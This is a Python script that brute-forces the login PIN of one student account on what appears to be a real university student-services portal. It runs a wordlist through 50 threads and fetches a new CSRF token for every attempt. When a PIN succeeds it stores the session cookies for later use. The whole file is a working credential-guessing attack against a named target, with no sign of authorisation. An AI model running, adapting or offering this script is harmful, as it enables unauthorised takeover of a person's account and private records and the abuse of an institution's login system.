#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json, sys, time, math, threading
from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

STUDENT_ID   = "10983384"
LOGIN_AS     = "student"
BASE         = "https://sts.ug.edu.gh/services/"   
LOGIN_URL    = urljoin(BASE, "")                      # login page lives at BASE
AUTH_URL     = urljoin(BASE, "authenticate")          # POST endpoint
WORDLIST_FILE = "pins1.txt"
MAX_THREADS   = 50
REPORT_EVERY  = 500
# -------------------------------------------

found_event = threading.Event()
progress = 0
progress_lock = threading.Lock()
total_pins = 0
start_ts = time.time()

def now_rate_eta():
    elapsed = time.time() - start_ts
    rate = (progress / elapsed) if elapsed > 0 else 0.0
    remain = max(0, total_pins - progress)
    eta_sec = (remain / rate) if rate > 0 else float('inf')
    return rate, eta_sec

def get_csrf_and_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    })
    r = s.get(LOGIN_URL, timeout=15)
    r.raise_for_status()
    soup = BeautifulSoup(r.text, "html.parser")
    token_el = soup.find("input", {"name": "_token"})
    if not token_el or not token_el.get("value"):
        raise RuntimeError("CSRF token not found on login page")
    return s, token_el["value"]

def try_pin(pin):
    """Run in a thread: new session, fetch CSRF for that session, then POST."""
    if found_event.is_set():
        return None

    try:
        s, token = get_csrf_and_session()
    except Exception:
        _inc_progress()
        return None

    payload = {
        "_token": token,
        "student_id": STUDENT_ID,
        "pin": pin,
        "loginas": LOGIN_AS,
    }
    headers = {
        "Referer": BASE,
        "Origin": BASE.rstrip("/"),
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    }

    try:
        resp = s.post(AUTH_URL, data=payload, headers=headers, timeout=15)
        # Try JSON first
        data = None
        try:
            data = resp.json()
        except ValueError:
            data = None

        success = False
        if isinstance(data, dict):
            success = (data.get("status") == "success") or bool(data.get("responseurl"))
        else:
            # Fallback: look for a redirect or success marker in HTML (adjust if needed)
            success = ("Dashboard" in resp.text) or ("Welcome" in resp.text)

        if success and not found_event.is_set():
            found_event.set()
            # save cookies for reference
            cookies_out = requests.utils.dict_from_cookiejar(s.cookies)
            with open("sts_session_cookies.json", "w", encoding="utf-8") as f:
                json.dump(cookies_out, f, indent=2)
            print(f"[+] SUCCESS! PIN found: {pin}")
            print("[+] Session cookies saved to sts_session_cookies.json")
    except Exception:
        pass
    finally:
        _inc_progress()
    return None

def _inc_progress():
    global progress
    with progress_lock:
        progress += 1
        if progress % REPORT_EVERY == 0 and not found_event.is_set():
            rate, eta = now_rate_eta()
            eta_str = ("{:.1f}m".format(eta/60) if math.isfinite(eta) else "∞")
            print(f"[*] Tried {progress:,}/{total_pins:,} "
                  f"({progress/total_pins*100:.2f}%). "
                  f"Rate ~{rate:.1f} pins/s, ETA ~{eta_str}")

def main():
    global total_pins, start_ts
    with open(WORDLIST_FILE, "r", encoding="utf-8") as f:
        pins = [line.strip() for line in f if line.strip()]
    total_pins = len(pins)
    if total_pins == 0:
        print("[!] pins.txt empty")
        sys.exit(1)

    print(f"[*] Starting threaded test with {total_pins:,} pins using {MAX_THREADS} threads...")
    start_ts = time.time()

    # IMPORTANT: If your PINs may start with 0, ensure pins.txt is zero-padded (e.g., 00000..99999)
    # Example generator used: f.write(f\"{i:05d}\\n\") for range(100000)

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as pool:
        futures = [pool.submit(try_pin, pin) for pin in pins]
        for _ in as_completed(futures):
            if found_event.is_set():
                break

    if not found_event.is_set():
        print("[-] Finished list. No valid PIN found.")
    else:
        elapsed = time.time() - start_ts
        print(f"[✓] Done in {elapsed:.2f}s")

if __name__ == "__main__":
    main()
